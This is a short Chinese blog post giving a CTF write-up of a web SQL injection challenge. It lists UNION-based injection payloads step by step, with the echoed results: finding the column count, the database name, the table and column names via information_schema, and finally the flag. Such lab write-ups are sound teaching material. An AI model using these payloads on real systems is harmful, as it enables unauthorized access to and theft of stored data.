---
title: web-sql注入
date: 2026-01-21 19:39:43
tags: [web-sql注入]
categories:
  - ctf题解
  - web
---



## web-sql注入

## 08 第八章 天衍真言，星图显圣 题解



1.判断字段数order by 2



2.判断回显位

'union select  1,2#

Welcome 1



3.数据库名

'union select database()#

Welcome user



4.尝试查询数据库名为user下的所有表名

'union select group_concat(table_name),2 from information_schema.tables where table_schema='user'#

Welcome flag,users



5.尝试查询 数据库名为user，表名为flag 下的所有列名

'union select group_concat(column_name),2 from information_schema.columns where table_schema='user' and table_name='flag'#

Welcome value



6.查找数据

错误答案：'union select value,2 from flag#   //忘记加数据库名了

'union select value,2 from user.flag#

